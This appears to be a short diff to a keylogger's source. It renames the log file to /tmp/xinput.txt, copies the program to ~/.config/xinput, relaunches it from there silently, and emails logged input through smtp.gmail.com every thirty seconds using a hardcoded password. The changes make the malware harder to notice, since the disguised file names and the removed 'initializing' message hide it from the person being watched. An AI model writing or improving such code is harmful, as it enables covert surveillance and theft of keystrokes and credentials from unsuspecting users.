@@ -12,7 +12,7 @@ PASSWORD = "abc123abc123"
 EMAIL_SERVER = "smtp.gmail.com"
 
 SLEEP_INTERVAL = 30
-LOG_FILE = "/tmp/zlogger.txt"
+LOG_FILE = "/tmp/xinput.txt"
 
 HOME_DIRECTORY = os.path.expanduser('~')
 
@@ -81,11 +81,8 @@ current_file = os.path.realpath(__file__)
 destination_file = HOME_DIRECTORY + "/.config/xinput"
 
 if current_file != destination_file:
-	print("initializing")
 	initialize()
-
-#Start logging
-start_logging(LOG_FILE)
-
-#send reports
-send_mail_reports_every(SLEEP_INTERVAL)
+	Popen(destination_file)
+else:
+	start_logging(LOG_FILE)
+	send_mail_reports_every(SLEEP_INTERVAL)
